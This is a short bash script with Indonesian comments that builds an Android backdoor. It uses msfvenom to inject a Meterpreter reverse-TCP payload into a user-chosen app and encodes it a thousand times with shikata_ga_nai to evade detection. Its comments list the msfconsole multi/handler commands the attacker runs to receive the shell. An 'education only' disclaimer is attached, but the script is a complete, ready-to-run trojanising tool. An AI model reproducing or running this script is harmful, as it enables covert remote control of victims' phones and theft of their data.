#!/bin/bash
# Backdoor android
# Hanya untuk edukasi, jangan disalahgunakan.

payload="android/meterpreter/reverse_tcp"

# Asumsi 
#----------------------------------------
# Ip penyerang (kali linux) 192.168.1.10 
# Port penyerang (kali linux) 4444
#----------------------------------------

read -p "Masukkan alamat ip address: " lhost
read -p "Masukkan port: " lport
read -p "Masukkan nama aplikasi untuk backdoor android: " nama_aplikasi
msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" -x "$nama_aplikasi" -e "shikata_ga_nai" -i "1000" > "$nama_aplikasi"

# Disisi penyerang (kali linux)
#----------------------------------------
# $ msfconsole                                  
# $ use exploit/multi/handler                   
# $ set payload android/meterpreter/reverse_tcp 
# $ set lhost 192.168.1.10                 
# $ set lport 4444                           
# $ exploit                                     
#----------------------------------------
